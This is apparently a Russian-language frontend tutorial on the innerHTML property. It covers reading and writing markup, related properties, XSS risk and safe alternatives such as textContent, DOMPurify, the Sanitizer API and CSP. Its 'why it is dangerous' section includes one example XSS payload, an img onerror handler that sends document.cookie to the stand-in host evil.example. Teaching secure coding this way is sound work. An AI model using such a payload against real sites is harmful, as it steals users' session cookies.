# innerHTML и его безопасность

> [!NOTE]
> `innerHTML` возвращает HTML-разметку содержимого элемента в виде строки, а при записи парсит строку и заменяет всех детей элемента. Это удобно, но опасно: вставка пользовательских данных через `innerHTML` открывает XSS-уязвимость. Для текста используют `textContent`, для разметки из ненадежных источников — санитайзер (DOMPurify) или построение DOM через `createElement`.

## Вопрос

Что делает `innerHTML`? Почему `innerHTML` небезопасен и как вставлять контент правильно?

## Чтение и запись

```javascript
const card = document.querySelector(".card");

card.innerHTML;                              // "<h2>Чайник</h2><p>1500 ₽</p>"
card.innerHTML = "<h2>Кружка</h2><p>300 ₽</p>"; // все дети заменены
card.innerHTML += "<p>Новинка</p>";          // перезаписывает всё содержимое заново
```

`+=` пересоздает всё содержимое: старые узлы удаляются вместе с обработчиками событий, состоянием полей ввода и фокусом.

## Родственные свойства

| Свойство | Что делает |
| --- | --- |
| `innerHTML` | HTML содержимого, запись парсит HTML |
| `outerHTML` | HTML вместе с самим элементом, запись заменяет элемент |
| `textContent` | весь текст, включая скрытый, запись вставляет только текст |
| `innerText` | видимый текст с учетом CSS, вызывает layout |
| `insertAdjacentHTML` | вставка HTML без удаления существующих детей |

## Почему это опасно

```javascript
const comment = '<img src="x" onerror="fetch(\'https://evil.example/?c=\' + document.cookie)">';
container.innerHTML = comment; // обработчик onerror выполнится — XSS
```

`<script>`, вставленный через `innerHTML`, не выполняется, но обработчики атрибутов (`onerror`, `onload`), ссылки `javascript:` и `<iframe srcdoc>` выполняются.

## Безопасные альтернативы

```javascript
// текст
el.textContent = userInput;

// построение DOM
const p = document.createElement("p");
p.textContent = comment.text;
container.append(p);

// разрешенный HTML от пользователя — только после санитайзера
import DOMPurify from "dompurify";
container.innerHTML = DOMPurify.sanitize(userHtml);

// новые API (поддержка растет)
container.setHTML(userHtml);  // Sanitizer API — встроенная очистка
```

Дополнительные слои защиты: Content Security Policy и Trusted Types, которые запрещают присваивать строки в опасные sinks без политики.

## Фреймворки

```jsx
<p>{comment.text}</p>                                    // React экранирует — безопасно
<div dangerouslySetInnerHTML={{ __html: comment.html }} /> // аналог innerHTML — только после очистки
```

Во Vue аналог — директива `v-html`.

## Производительность

- запись `innerHTML` удаляет и создает все дочерние узлы — дорого для больших списков;
- для частых обновлений точечно меняйте `textContent` или атрибуты;
- для массовой вставки HTML-строка через `innerHTML` бывает быстрее множества `createElement`, но только для доверенного контента.

## Что важно помнить

- Данные из API, URL (`location.hash`, query-параметры), `localStorage` и `postMessage` — тоже ненадежны.
- Санитайзинг регулярными выражениями не работает — используйте проверенные библиотеки.
- `innerHTML` на `<template>`, `<table>` и SVG имеет особенности парсинга.
- `textContent` не парсит HTML, поэтому быстрее и безопаснее.

## Мини-шпаргалка

- `innerHTML` — читать или заменить HTML содержимого.
- Пользовательские данные в `innerHTML` → XSS.
- Текст — `textContent`.
- Чужой HTML — DOMPurify или Sanitizer API.
- `+=` пересоздает всё содержимое.
